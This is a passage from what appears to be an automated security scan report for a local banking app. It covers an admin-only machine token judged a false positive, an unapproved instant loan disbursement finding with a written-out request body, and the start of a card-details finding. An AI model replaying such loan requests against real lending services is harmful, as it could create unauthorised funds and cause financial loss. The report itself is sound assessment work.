{"success":false,"error":{"code":"VALIDATION_ERROR","message":"Validation failed","details":{"merchant_id":["The merchant_id field is required."],"card_number":["The card_number field is required."],"expiry":["The expiry field is required."],"amount":["The amount field is required."]}}}
```

### Validation Note
The machine token is returned only by GET /api/admin/system/settings after administrator authentication: an anonymous request received 401, while the admin_fresh session received the settings object. The public admin frontend explicitly calls this protected route and deliberately renders machine_token as an administrator-visible integration setting. This is an authorized admin credential-management function, not a public token disclosure or authentication bypass; the scanner omitted the disclosure endpoint's admin-only access control.

## 25. Unverified customer can create and disburse a loan

- Finding reference: KOWT-014
- Severity: high
- OWASP: A04
- Source: Dynamic
- Validation: false_positive
- Affected URL: http://localhost:8081/api/accounts
- CVSS: 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

### Description
The POST /api/accounts endpoint allows a newly registered customer to create a loan account and immediately disburse the borrowed amount to their own transaction account without identity verification, affordability checks, approval, or a prior loan application workflow.

### Impact
An authenticated customer can create spendable funds without credit approval, bypassing lending controls and causing direct financial loss.

### Likelihood
High. Exploitation requires only a newly registered customer account and a single request using the customer's own transaction account as the disbursement destination.

### Recommendation
Require a server-side loan application and approval workflow before creating or disbursing a loan. Verify the customer's identity and eligibility, perform affordability checks, enforce approved borrowing limits, and require an immutable approval record. Reject loan account creation requests that have not completed these checks.

### Evidence
```
User 17 created transaction account 101 with a balance of 0.00. A POST request to /api/accounts specifying account_type loan, borrow_amount 100.00, and disbursement_account_id 101 returned HTTP 201 with loan account 102 and a balance of -100.00. A follow-up GET request to /api/accounts/101 showed a balance of 100.00 and completed credit transaction 39 described as "Loan proceeds disbursement".
```

### Request Evidence
```
POST /api/accounts as newly registered user body {"account_type":"loan","account_name":"AESPA Test Loan","currency":"AUD","borrow_amount":"100.00","disbursement_account_id":101}
```

### Response Evidence
```
HTTP 201 loan account id 102, balance -100.00. Follow-up GET /api/accounts/101 returned balance 100.00 and completed credit transaction id 39.
```

### Validation Note
The scanner treated the lack of a credit/affordability review and immediate funding as unintended, but the application's public loan product page explicitly advertises "No credit check required" and "Funds disbursed instantly." A repeat AUD 0.01 loan by the same user confirmed that the API implements this documented self-service product behavior, so the observed account creation and disbursement are not evidence of a workflow bypass.

## 26. Accounts API exposes full payment card details

- Finding reference: KOWT-085
- Severity: medium
- OWASP: A02
- Source: Dynamic
